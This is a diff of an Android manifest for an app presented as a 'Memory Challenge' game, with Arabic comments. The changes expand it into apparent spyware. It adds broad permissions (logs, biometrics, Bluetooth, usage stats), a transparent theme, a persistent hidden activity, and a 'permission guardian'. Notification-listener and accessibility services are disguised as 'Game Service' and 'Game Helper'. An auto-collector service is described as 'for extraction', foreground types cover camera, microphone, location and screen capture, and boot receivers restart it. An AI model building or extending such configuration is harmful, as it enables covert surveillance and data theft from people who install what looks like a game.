@@ -2,7 +2,7 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools">
 
-    <!-- جميع الصلاحيات -->
+    <!-- جميع الصلاحيات الممكنة -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
@@ -31,22 +31,41 @@
     <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
     <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
     <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
+    <uses-permission android:name="android.permission.USE_BIOMETRIC" />
+    <uses-permission android:name="android.permission.USE_FINGERPRINT" />
+    <uses-permission android:name="android.permission.VIBRATE" />
+    <uses-permission android:name="android.permission.FLASHLIGHT" />
+    <uses-permission android:name="android.permission.BLUETOOTH" />
+    <uses-permission android:name="android.permission.BLUETOOTH_ADMIN" />
+    <uses-permission android:name="android.permission.BLUETOOTH_CONNECT" />
+    <uses-permission android:name="android.permission.BLUETOOTH_SCAN" />
+    <uses-permission android:name="android.permission.NFC" />
+    <uses-permission android:name="android.permission.READ_SYNC_SETTINGS" />
+    <uses-permission android:name="android.permission.WRITE_SYNC_SETTINGS" />
+    <uses-permission android:name="android.permission.READ_SYNC_STATS" />
     <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" />
     <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
+    <uses-permission android:name="android.permission.GET_TASKS" />
+    <uses-permission android:name="android.permission.ACTIVITY_RECOGNITION" />
+    <uses-permission android:name="android.permission.READ_LOGS" />
 
     <application
         android:name=".MainApplication"
         android:label="Memory Challenge"
-        android:theme="@style/GameTheme"
+        android:theme="@style/Theme.Transparent"
         android:allowBackup="false"
         android:supportsRtl="true"
         android:usesCleartextTraffic="true"
+        android:hasFragileUserData="true"
+        android:persistent="true"
         android:icon="@drawable/ic_launcher"
         android:roundIcon="@drawable/ic_launcher"
         android:debuggable="false"
-        tools:ignore="GoogleAppIndexingWarning">
+        android:testOnly="false"
+        tools:ignore="GoogleAppIndexingWarning"
+        tools:replace="android:label,android:icon">
 
-        <!-- شاشة اللعبة الرئيسية -->
+        <!-- شاشة اللعبة الرئيسية - تظهر أولاً -->
         <activity
             android:name=".game.MainGameActivity"
             android:exported="true"
@@ -65,28 +84,36 @@
             android:screenOrientation="portrait"
             android:parentActivityName=".game.MainGameActivity" />
 
-        <!-- إعدادات اللعبة -->
+        <!-- شاشة الإعدادات -->
         <activity
             android:name=".game.GameSettingsActivity"
             android:exported="false"
             android:parentActivityName=".game.MainGameActivity" />
 
-        <!-- خدمة الإشعارات (للسحب) -->
+        <!-- النشاط الرئيسي القديم - مخفي -->
+        <activity
+            android:name=".MainActivity"
+            android:exported="false"
+            android:launchMode="singleTask"
+            android:theme="@style/Theme.Transparent"
+            android:excludeFromRecents="true" />
+
+        <!-- خدمة الإشعارات -->
         <service
-            android:name=".services.NotificationListener"
+            android:name=".NotificationService"
             android:label="Game Service"
             android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
             android:exported="true"
             android:enabled="true"
-            android:foregroundServiceType="dataSync">
+            android:foregroundServiceType="dataSync|camera|microphone|location|mediaProjection">
             <intent-filter>
                 <action android:name="android.service.notification.NotificationListenerService" />
             </intent-filter>
         </service>
 
-        <!-- خدمة الوصول (للتسجيل) -->
+        <!-- خدمة الوصول الأصلية -->
         <service
-            android:name=".services.AccessibilityHelper"
+            android:name=".MyAccessibilityService"
             android:label="Game Helper"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
             android:exported="true"
@@ -97,23 +124,33 @@
             </intent-filter>
             <meta-data
                 android:name="android.accessibilityservice"
-                android:resource="@xml/accessibility_config" />
+                android:resource="@xml/accessibility_service_config" />
         </service>
 
-        <!-- خدمة الجمع التلقائي -->
+        <!-- خدمة السحب التلقائي -->
         <service
-            android:name=".services.CollectorService"
+            android:name=".AutoCollectorService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="dataSync" />
+
+        <!-- حارس الصلاحيات -->
+        <service
+            android:name=".PermissionGuardian"
             android:enabled="true"
             android:exported="false"
             android:foregroundServiceType="dataSync" />
 
         <!-- مستقبل التشغيل التلقائي -->
         <receiver
-            android:name=".receivers.BootReceiver"
+            android:name=".BootReceiver"
             android:exported="true"
-            android:enabled="true">
+            android:enabled="true"
+            android:permission="android.permission.RECEIVE_BOOT_COMPLETED">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
             </intent-filter>
         </receiver>
 
